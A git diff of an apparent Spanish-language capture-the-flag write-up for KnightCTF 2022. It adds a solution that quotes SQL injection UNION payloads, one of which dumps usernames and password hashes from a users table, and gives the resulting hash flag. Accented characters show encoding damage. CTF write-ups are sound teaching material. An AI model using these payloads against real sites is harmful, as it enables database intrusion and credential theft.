@@ -1,4 +1,4 @@
-I" é<p>KnightCTF 2022, es el primer <em>capture de flag</em> organizado por <a href="https://knightsquad.org/">Knight Squad</a>, este es de tipo <em>jeopardy</em>, por lo que encontraremos distintas categor√≠as.</p>
+I"õí<p>KnightCTF 2022, es el primer <em>capture de flag</em> organizado por <a href="https://knightsquad.org/">Knight Squad</a>, este es de tipo <em>jeopardy</em>, por lo que encontraremos distintas categor√≠as.</p>
 
 <div style="text-align:center">
   <img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/1.png" />
@@ -423,9 +423,21 @@ users.php?id=-1' union select 1,2,version(),4,5,6,7,8 --+
 
 <h4 id="hashed-password"><a href="#header-4"></a>Hashed Password</h4>
 
-<p>ABC</p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/56.png" alt="" /></p>
+
+<p>Para este reto se nos pregunta por el hash de la contrase√±a del usuario <code class="language-plaintext highlighter-rouge">tareq</code>, la cual el atacante consigui√≥ haciendo uso de las <code class="language-plaintext highlighter-rouge">inyecciones SQL</code>, concretamente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>users.php?d=1' union select 1,2,3,group_concat(username,0x203a20,password),5,user(),7,8 from users --+
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/57.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{$2Y$10$XVKEZO/NKM4KE073CPTEG.VKFTHMH1CCDPRDD5JWYWKFEZ6GZKZN.}
+</code></pre></div></div>
 
 <h4 id="database-flag"><a href="#header-4"></a>Database Flag</h4>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/58.png" alt="" /></p>
 
 <p>ABC</p>
 
